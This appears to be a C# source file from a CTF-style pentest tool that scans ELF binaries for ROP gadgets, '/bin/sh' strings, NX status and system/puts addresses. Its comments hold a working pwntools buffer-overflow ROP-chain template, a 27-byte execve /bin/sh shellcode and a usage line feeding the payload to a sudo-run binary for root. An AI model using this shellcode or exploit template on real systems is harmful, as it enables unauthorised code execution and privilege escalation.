﻿using System;
using System.Collections.Generic;
using System.IO;

namespace Reecon
{
    class Pwn
    {
        public static void Scan(string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine("rop Usage: reecon -rop fileNameHere");
                return;
            }
            string fileName = args[1];
            if (!File.Exists(fileName))
            {
                Console.WriteLine(fileName + " does not exist.");
            }
            ScanFile(fileName);
        }

        private static void ScanFile(string fileName)
        {
            Architecture architecture = IDElf(fileName);
            if (architecture == Architecture.x86)
            {
                Console.WriteLine("Architecture: x86");
                // You can get a segfault address of x86 programs by going
                // dmesg | tail -2 (Sometimes the last entry isn't for it)
                // dmesg | grep "ret2win32" | tail -1
            }
            else if (architecture == Architecture.x64)
            {
                Console.WriteLine("Architecture: x64");
                /*
                 * http://shell-storm.org/shellcode/
                    -> Linux/x86-64 - Execute /bin/sh - 27 bytes by Dad`
                    --> \x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
                */
            }
            else
            {
                Console.WriteLine("Architecture: Unknown - Can only deal with ELFs");
            }

            // pwn cyclic 500
            // aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae

            if (General.IsInstalledOnLinux("ropper"))
            {
                Console.WriteLine("Searching for 'pop rdi; ret;'");
                List<string> ropperOutput = General.GetProcessOutput("ropper", $"--nocolor --file {fileName} --search \"pop rdi; ret;\"");
                foreach (string item in ropperOutput)
                {
                    if (!item.StartsWith("[INFO]") && !item.StartsWith("[LOAD]"))
                    {
                        Console.WriteLine("pop rdi; ret; (pop_rdi) --> " + item);
                    }
                }
                ropperOutput = General.GetProcessOutput("ropper", $"--nocolor --file {fileName} --string \"/bin/sh\"");
                foreach (string item in ropperOutput)
                {
                    if (!item.StartsWith("[INFO]") && !item.StartsWith("[LOAD]") && item.Contains("/bin/sh"))
                    {
                        Console.WriteLine("/bin/sh --> " + item);
                    }
                }
                // // ropper --file sudo_pwn_file_here --string "/bin/sh"
            }
            else
            {
                Console.WriteLine("- ropper is not installed - Skipping gadget check and string search");
            }
            if (General.IsInstalledOnLinux("rabin2"))
            {
                List<string> rabin2Output  = General.GetProcessOutput("rabin2", "-I ./" + fileName);
                foreach (string item in rabin2Output)
                {
                    if (item.Trim().StartsWith("nx") && item.Contains("false"))
                    {
                        Console.WriteLine("- nx is disabled - You can run your own shellcode!");
                        if (architecture == Architecture.x64)
                        {
                            Console.WriteLine(@"Linux/x86-64 - Execute /bin/sh: \x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05");
                        }
                        else
                        {
                            Console.WriteLine("Bug Reelix to fix his code!");
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine("- rabin2 is not installed - Skipping nx check");
            }
            if (General.IsInstalledOnLinux("objdump"))
            {
                List<string> objdumpOutput = General.GetProcessOutput("objdump", $"-D {fileName}");
                foreach (string item in objdumpOutput)
                {
                    if (item.Contains("call") && item.Contains("system")) // callq contains call
                    {
                        Console.WriteLine("system --> " + item);
                    }
                    if (item.Contains("puts@plt") && item.Trim().EndsWith(":"))
                    {
                        Console.WriteLine("puts@plt (plt_puts) --> " + item);
                    }
                    if (item.Contains("puts@GLIBC"))
                    {
                        Console.WriteLine("puts@GLIBC (got_puts) --> " + item);
                    }
                }
            }
            else
            {
                Console.WriteLine("- objdump is not installed - Skipping syscalls");
            }
            Console.WriteLine("Finished");
        }
        // For Reversing - I doubt this will ever get really used, so it's more just useful reversing stuff

        // python3 -c 'from pwn import *;someval = ("A"*44).encode() + p32(0x804862c);f = open("exploit","wb");f.write(someval);f.close()' && cat exploit | ./ret2win32

        // Rop Chain Shellcode Breakdown
        // https://medium.com/@iseethieves/intro-to-rop-rop-emporium-split-9b2ec6d4db08

        // from pwn import *
        // elf = context.binary = ELF('./sudo_pwn_file_here')

        // # Start
        // io = process(elf.path)

        // # Cyclic Crash
        // io.sendline(cyclic(512))

        // # Wait for it to crash
        // io.wait()

        // # Read the core file of the crash
        // core = io.corefile

        // # read the stack point at the time of the crash
        // stack = core.rsp

        // # Find the offset
        // pattern = core.read(stack, 4)
        // offset = cyclic_find(pattern)

        // ropper --file sudo_pwn_file_here --search "pop rdi; ret;"
        // ropper --file sudo_pwn_file_here --string "/bin/sh"
        // objdump -D ./sudo_pwn_file_here | grep system

        // rop_chain = p64(pop_rdi, endian= "little")
        // rop_chain += p64(bin_sh, endian= "little")
        // rop_chain += p64(system, endian= "little")

        // # Add the padding so it does it after the crash spot
        // padding = cyclic(offset)
        // OR padding = ('A' * 44).encode()
        // payload = padding + rop_chain
        // f = open('exploit','wb')
        // f.write(payload)
        // f.close()

        // Usage: (cat exploit; cat) | sudo /sudo_pwn_file_here

        // ELF Header:
        // 7f
        // 45 4c 46 (E L F)
        // 01 (x86) | 02 (x64)
        private enum Architecture
        {
            x86,
            x64,
            Unknown
        }

        private static Architecture IDElf(string filePath)
        {
            byte[] headerBytes = new byte[5];
            using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
            {
                fileStream.Read(headerBytes, 0, 5);
            }
            if (headerBytes[0] != 0x7f || headerBytes[1] != 0x45 || headerBytes[2] != 0x4c || headerBytes[3] != 0x46)
            {
                Console.WriteLine("Not an ELF header");
                return Architecture.Unknown;
            }
            if (headerBytes[4] == 0x01)
            {
                return Architecture.x86;
            }
            else if (headerBytes[4] == 0x02)
            {
                return Architecture.x64;
            }
            else
            {
                Console.WriteLine("Unknown File Type Identifier");
                return Architecture.Unknown;
            }
        }
    }
}
